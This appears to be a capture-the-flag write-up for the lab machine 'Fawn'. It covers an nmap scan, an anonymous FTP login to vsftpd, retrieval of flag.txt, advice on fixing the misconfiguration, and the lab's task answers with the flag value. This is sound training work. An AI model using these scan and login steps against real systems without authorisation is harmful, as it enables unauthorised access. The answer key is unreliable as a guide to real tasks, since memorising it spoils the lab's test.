# Fawn

---

## Setup

After connecting to the VPN and spawning the machine, I always store the IP address of the target machine in an environment variable in case I lose it.

```
$ export IP=10.129.188.254
$ echo $IP
10.129.188.254
```

To make sure that the target machine is up and running, we can use the command `ping` to test our connection

```
$ ping $IP
PING 10.129.188.254 (10.129.188.254) 56(84) bytes of data.
64 bytes from 10.129.188.254: icmp_seq=1 ttl=63 time=132 ms
64 bytes from 10.129.188.254: icmp_seq=2 ttl=63 time=67.0 ms
64 bytes from 10.129.188.254: icmp_seq=3 ttl=63 time=66.5 ms
64 bytes from 10.129.188.254: icmp_seq=4 ttl=63 time=67.1 ms
^C
```

---

## Scanning

First, I run a scan on the target machine to identify open ports and running services that might be vulnerable using [nmap](https://nmap.org) with the following flags:
`-sV`: Determine running services/versions on open ports
`-sC`: Run default scripts
`-p-`: Scan all possible ports
`-v`: Verbose output for more information about the scan
`-oN`: Write the output of the scan into a file

```
$ nmap -sV -sC -p- -v -oN scan.nmap $IP
```

After the scan is complete, port 21 was found to be running FTP service that allows anonymous login with no password according to the scan result:

```
Nmap scan report for 10.129.188.254
Host is up (0.23s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.17.23
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
Service Info: OS: Unix
```

---

## FTP Exploitation

FTP "[File Transfer Protocol](https://en.wikipedia.org/wiki/File_Transfer_Protocol)" according to wikipedia:
>A standard communication protocol used for the transfer of computer files from a server to a client on a computer network. FTP is built on a client–server model architecture using separate control and data connections between the client and the server. FTP users may authenticate themselves with a clear-text sign-in protocol, normally in the form of a username and password, but can connect anonymously if the server is configured to allow it.

We can start by trying to connect to the FTP server with anonymous username and no password by using the format `[ftp://[USER[:PASSWORD]@]HOST[:PORT]/PATH[/][;type=TYPE]]` and see what comes out.

```
$ ftp ftp://anonymous@$IP           
Connected to 10.129.188.254.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> 
```

and we're in! now we start to navigate in the directories and see if we find somethin interesting, and right off the bat after using `ls` we immediately see the file we're interested in `flag.txt` with our guest (anonymous) privs. Now we can download this file to our local machine simply by using the command `get` and then disconnect from the server by using the fancy `bye` command

```
ftp> ls
229 Entering Extended Passive Mode (|||43051|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> bye
221 Goodbye.

$ cat flag.txt
<FLAG>
```

---

## Vulnerability

In this machine, the vulerability that allowed us to exploit it is that the FTP service allowed anonymous login with a blank password, allowing us to access files that this host might not want us to access, It's better to disable this feature or protect sensitive files and requrie an authenticated login to access them.

Also it is safer to encrypt the contents of the FTP server and secure it with SSL/TLS (FTPS) or SFTP (SSH File Transfer Protocol)

---

## Tasks & Answers

<details>
    <summary><b>Task 1: </b>What does the 3-letter acronym FTP stand for?</summary>

    File Transfer Protocol
</details>

<details>
    <summary><b>Task 2: </b>Which port does the FTP service listen on usually?</summary>

    21
</details>

<details>
    <summary><b>Task 3: </b>What acronym is used for the secure version of FTP?</summary>

    SFTP
</details>


<details>
    <summary><b>Task 4: </b>What is the command we can use to send an ICMP echo request to test our connection to the target?</summary>

    ping
</details>

<details>
    <summary><b>Task 5: </b>From your scans, what version is FTP running on the target?</summary>

    3.0.3
</details>

<details>
    <summary><b>Task 6: </b>From your scans, what OS type is running on the target?</summary>

    Unix
</details>

<details>
    <summary><b>Task 7: </b>What is the command we need to run in order to display the 'ftp' client help menu?</summary>

    ftp -h
</details>

<details>
    <summary><b>Task 8: </b>What is username that is used over FTP when you want to log in without having an account?</summary>

    anonymous
</details>

<details>
    <summary><b>Task 9: </b>What is the response code we get for the FTP message 'Login successful'?</summary>

    230
</details>

<details>
    <summary><b>Task 10: </b>There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.</summary>

    ls
</details>

<details>
    <summary><b>Task 11: </b>What is the command used to download the file we found on the FTP server?</summary>

    get
</details>

<details>
    <summary><b>FLAG:</b></summary>

    035db21c881520061c53e0536e44f815
</details>